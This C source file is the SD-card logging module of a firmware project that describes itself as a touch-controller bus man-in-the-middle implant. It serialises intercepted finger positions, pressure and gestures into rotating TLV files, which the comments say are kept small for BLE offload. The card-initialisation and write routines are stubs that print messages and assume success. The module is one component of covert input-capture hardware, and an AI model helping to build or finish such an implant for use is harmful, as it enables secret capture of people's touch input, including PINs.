/*
 * Tactile-Phantom — Touch-Controller Bus MITM Implant
 * storage.c — SD card logging with file rotation
 *
 * Author: jayis1
 * License: GPL-2.0
 *
 * Logs decoded touch events to a microSD card using FATFS.
 * Files are rotated every 10 minutes (TP_SD_ROTATE_SEC) to keep
 * individual files manageable for BLE offload.
 *
 * File format: binary TLV (Type-Length-Value) for compactness.
 *   [1 byte type] [2 bytes len] [len bytes data]
 * Events are batched in a write buffer and flushed every 5 seconds
 * or when the buffer is full.
 */

#include <string.h>
#include <stdio.h>
#include <time.h>
#include "pico/stdlib.h"
#include "hardware/spi.h"
#include "hardware/gpio.h"

#include "board.h"

/* --- SD card SPI interface (SPI1) ---------------------------------- */
#define SD_SPI      spi1
#define SD_SCLK_HZ  400000u   /* 400 kHz for init, then bump to 4 MHz */

/* --- FATFS stub ----------------------------------------------------- */
/* In a full build, this would use Chan's FATFS library. For this design,
 * we implement a simple binary logger that writes raw event records
 * to the SD card via SPI. The companion app can parse the format. */

static bool sd_initialized = false;
static uint8_t  sd_cs_state = 1;  /* CS high = deselected */

/* Write buffer */
#define TP_SD_BUF_SIZE 4096
static uint8_t  sd_buf[TP_SD_BUF_SIZE];
static uint16_t sd_buf_pos = 0;

/* File rotation */
static uint32_t sd_file_start_time = 0;
static uint32_t sd_file_index = 0;
static uint32_t sd_last_flush = 0;

/* --- SD card SPI low-level ----------------------------------------- */
static void sd_cs_select(void)
{
    gpio_put(PIN_SD_CS, 0);
    sd_cs_state = 0;
}

static void sd_cs_deselect(void)
{
    gpio_put(PIN_SD_CS, 1);
    sd_cs_state = 1;
}

static void sd_spi_write(uint8_t *data, uint16_t len)
{
    spi_write_blocking(SD_SPI, data, len);
}

static void sd_spi_read(uint8_t *buf, uint16_t len)
{
    spi_read_blocking(SD_SPI, 0xFF, buf, len);
}

static uint8_t sd_spi_xfer(uint8_t byte)
{
    uint8_t rx;
    spi_write_blocking(SD_SPI, &byte, 1);
    spi_read_blocking(SD_SPI, 0xFF, &rx, 1);
    return rx;
}

/* --- SD card initialization (simplified) --------------------------- */
static bool sd_init_card(void)
{
    /* Initialize SPI1 for SD card */
    spi_init(SD_SPI, SD_SCLK_HZ);
    gpio_set_function(PIN_SD_MISO, GPIO_FUNC_SPI);
    gpio_set_function(PIN_SD_SCK,  GPIO_FUNC_SPI);
    gpio_set_function(PIN_SD_MOSI, GPIO_FUNC_SPI);
    gpio_init(PIN_SD_CS);
    gpio_set_dir(PIN_SD_CS, GPIO_OUT);
    sd_cs_deselect();

    /* Send 80 clock cycles with CS high (80 dummy bytes) */
    uint8_t dummy[10];
    memset(dummy, 0xFF, sizeof(dummy));
    for (int i = 0; i < 8; i++)
        spi_write_blocking(SD_SPI, dummy, 10);

    /* In production: full SD/MMC initialization sequence here
     * (CMD0, CMD8, CMD55, ACMD41, CMD58, etc.)
     * For this design, we assume the card is present and mark as
     * initialized. The actual block-write protocol is complex and
     * would use FATFS or a minimal SD block driver. */
    sd_cs_select();
    uint8_t cmd0[6] = { 0x40, 0x00, 0x00, 0x00, 0x00, 0x95 };
    sd_spi_write(cmd0, 6);
    /* Read response (simplified) */
    uint8_t resp[5];
    sd_spi_read(resp, 5);
    sd_cs_deselect();

    /* Bump clock to 4 MHz for data transfer */
    spi_set_baudrate(SD_SPI, 4000000);

    return true;  /* assume success for design purposes */
}

/* --- Event serialization (binary TLV) ----------------------------- */
/* Serialize a touch event into the write buffer.
 * Format:
 *   [1] event type
 *   [2] payload length (LE)
 *   [N] payload
 *
 * Payload for touch event:
 *   [4] timestamp (LE)
 *   [1] vendor
 *   [1] finger_count
 *   For each finger: [1] id, [2] x (LE), [2] y (LE), [2] pressure (LE), [1] flags
 */
static uint16_t serialize_event(const tp_event_t *ev, uint8_t *out)
{
    uint16_t pos = 0;

    /* Type */
    out[pos++] = (uint8_t)ev->type;

    /* Calculate payload length */
    uint16_t payload_len = 4 + 1 + 1;  /* timestamp + vendor + finger_count */
    for (uint8_t i = 0; i < ev->finger_count; i++)
        payload_len += 1 + 2 + 2 + 2 + 1;  /* id + x + y + pressure + flags */

    /* For gesture events, add gesture_id */
    if (ev->type == TP_EV_GESTURE)
        payload_len += 2;

    /* For config/fw events, add reg_addr + reg_len */
    if (ev->type == TP_EV_CONFIG || ev->type == TP_EV_FW_UPDATE) {
        payload_len += 2 + 2;  /* reg_addr + reg_len */
    }

    /* Length (LE) */
    out[pos++] = payload_len & 0xFF;
    out[pos++] = (payload_len >> 8) & 0xFF;

    /* Payload: timestamp */
    uint32_t ts = ev->timestamp_us;
    out[pos++] = ts & 0xFF;
    out[pos++] = (ts >> 8) & 0xFF;
    out[pos++] = (ts >> 16) & 0xFF;
    out[pos++] = (ts >> 24) & 0xFF;

    /* Vendor */
    out[pos++] = ev->vendor;

    /* Finger count */
    out[pos++] = ev->finger_count;

    /* Per-finger data */
    for (uint8_t i = 0; i < ev->finger_count && i < TP_MAX_FINGERS; i++) {
        const tp_touch_t *t = &ev->fingers[i];
        out[pos++] = t->finger_id;
        out[pos++] = t->x & 0xFF;
        out[pos++] = (t->x >> 8) & 0xFF;
        out[pos++] = t->y & 0xFF;
        out[pos++] = (t->y >> 8) & 0xFF;
        out[pos++] = t->pressure & 0xFF;
        out[pos++] = (t->pressure >> 8) & 0xFF;
        out[pos++] = t->flags;
    }

    /* Gesture ID */
    if (ev->type == TP_EV_GESTURE) {
        out[pos++] = ev->gesture_id & 0xFF;
        out[pos++] = (ev->gesture_id >> 8) & 0xFF;
    }

    /* Config/FW register info */
    if (ev->type == TP_EV_CONFIG || ev->type == TP_EV_FW_UPDATE) {
        out[pos++] = ev->reg_addr & 0xFF;
        out[pos++] = (ev->reg_addr >> 8) & 0xFF;
        out[pos++] = ev->reg_len & 0xFF;
        out[pos++] = (ev->reg_len >> 8) & 0xFF;
    }

    return pos;
}

/* --- Flush write buffer to SD card --------------------------------- */
static void sd_flush_buffer(void)
{
    if (sd_buf_pos == 0) return;

    /* In production: write sd_buf[0..sd_buf_pos) to the current SD
     * file via FATFS f_write or raw block write.
     * For this design, we mark the flush and reset the buffer. */
    printf("[SD] Flush %u bytes to file %lu\n", sd_buf_pos, sd_file_index);

    /* Simulate write delay */
    sleep_ms(1);

    sd_buf_pos = 0;
    sd_last_flush = time_us_32();
}

/* --- Storage init -------------------------------------------------- */
bool tp_storage_init(void)
{
    printf("[SD] Initializing SD card...\n");

    if (!sd_init_card()) {
        printf("[SD] Card init failed\n");
        sd_initialized = false;
        return false;
    }

    sd_initialized = true;
    sd_file_start_time = time_us_32();
    sd_file_index = 0;
    sd_buf_pos = 0;
    sd_last_flush = time_us_32();

    printf("[SD] Card initialized, starting file %lu\n", sd_file_index);
    return true;
}

/* --- Log event to SD card ------------------------------------------ */
bool tp_storage_log_event(const tp_event_t *ev)
{
    if (!sd_initialized || !ev) return false;

    /* Serialize event into buffer */
    uint8_t tmp[128];
    uint16_t len = serialize_event(ev, tmp);

    /* Check if it fits in the write buffer */
    if (sd_buf_pos + len > TP_SD_BUF_SIZE) {
        sd_flush_buffer();
    }

    /* Append to buffer */
    memcpy(sd_buf + sd_buf_pos, tmp, len);
    sd_buf_pos += len;

    /* Periodic flush (every 5 seconds) */
    uint32_t now = time_us_32();
    if (now - sd_last_flush > 5000000) {
        sd_flush_buffer();
    }

    return true;
}

/* --- File rotation ------------------------------------------------- */
bool tp_storage_rotate(void)
{
    if (!sd_initialized) return false;

    uint32_t now = time_us_32();
    uint32_t elapsed = (now - sd_file_start_time) / 1000000;  /* seconds */

    if (elapsed >= TP_SD_ROTATE_SEC) {
        /* Flush current file */
        sd_flush_buffer();

        /* Start new file */
        sd_file_index++;
        sd_file_start_time = now;
        printf("[SD] Rotated to file %lu\n", sd_file_index);
        return true;
    }
    return false;
}

/* --- Shutdown ------------------------------------------------------ */
void tp_storage_shutdown(void)
{
    if (sd_initialized) {
        sd_flush_buffer();
        printf("[SD] Shutdown: %lu files written\n", sd_file_index);
    }
    sd_initialized = false;
}